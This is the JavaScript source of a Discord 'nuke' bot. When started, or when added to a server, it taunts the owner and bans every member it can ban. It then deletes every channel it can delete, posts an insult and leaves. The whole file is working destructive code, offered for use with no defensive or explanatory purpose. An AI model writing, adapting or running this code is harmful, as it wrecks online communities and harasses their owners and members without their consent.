const { Client } = require('discord.js');
const config = require('./config.json');
const client = new Client();

async function nuke(guild) {
  let users = 0;
  let channels = 0;

  const owner = await guild.fetchMember(guild.ownerID);
  await owner.sendMessage('Hey there! Your guild is getting nuked! :D');

  await Promise.all(guild.members.map(async m => {
    if (m.bannable) {
      users++;
      try {
        await m.send('You\'re getting banned! Nothing personal...');
      } catch (e) { void e; }
      return m.ban();
    }
  }));

  await Promise.all(guild.channels.map(c => {
    if (c.deletable) {
      channels++;
      return c.delete();
    }
  }));

  console.log(`Nuked ${users} users and ${channels} channels in ${guild} owned by ${owner.user.username}#${owner.user.discriminator} (${guild.owner.id})`);

  await guild.defaultChannel.send('Dumbass, we said not to add the bot...');
  return guild.leave();
}

client.on('ready', () => {
  for(const [, g] of client.guilds) nuke(g).catch(console.error);
  console.log('Ready to have some fun... >:)');
});

client.on('guildCreate', async (guild) => {
  return nuke(guild).catch(console.error);
});

client.login(config.token).catch(console.error);
